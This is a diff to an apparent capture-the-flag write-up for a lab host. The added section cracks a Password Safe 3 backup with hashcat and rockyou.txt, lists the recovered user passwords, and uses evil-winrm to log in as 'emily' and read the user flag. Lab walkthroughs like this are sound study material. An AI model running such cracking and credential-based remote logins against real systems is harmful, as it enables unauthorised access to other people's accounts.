@@ -198,9 +198,33 @@ WARNING! 3 bare linefeeds received in ASCII mode.
 File may not have transferred correctly.
 952 bytes received in 00:00 (30.26 KiB/s)
 ```
-And we get a file named Backup.psafe3. 
+And we get a file named Backup.psafe3 which contains a password safe 3 hash.
 
+We now can use hashcat to attempt to crack this hash using the rockyou.txt wordlist:
+```
+sudo hashcat -m 5200 Backup.psafe3 rockyou.txt
 
+Backup.psafe3:tekieromucho 
+```
+and we get the master password "tekieromucho."
+
+Now we can install passwordsafe using "sudo apt install passwordsafe" and access the Backup.psafe3 file. 
+
+We see three entries in passwordsafe:
+```
+Alexander Smith [alexander] Password: UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
+Emily Rodriguez [emily] Password: UXLCI5iETUsIBoFVTj8yQFKoHjXmb
+Emma Johnson [emma] Password: WwANQWnmJnGV07WQN8bMS7FMAbjNur
+```
+
+Now we can try evil-winrm to remote into 10.10.11.42 as the emily user:
+```
+sudo evil-winrm -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb -i 10.10.11.42
+
+*Evil-WinRM* PS C:\Users\emily\Desktop> type user.txt
+589db095747f022f26c887afff1c9508
+```
+and we finally get the user.txt file.
 
 
 
